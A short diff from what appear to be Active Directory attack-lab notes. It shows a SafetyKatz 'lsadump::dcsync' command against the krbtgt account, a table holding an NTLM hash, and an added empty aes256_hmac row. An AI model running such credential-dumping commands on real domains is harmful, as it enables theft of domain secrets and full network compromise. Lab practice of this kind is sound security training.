@@ -366,6 +366,7 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 | ----------- | ---------------------------------------------------------------- |
 | Password    | null                                      |
 | NTLM | 4e9815869d2090ccfca61c1fe0d23986 |
+| aes256_hmac |  |
 
 `sqladmin - DCORP-DC`
 
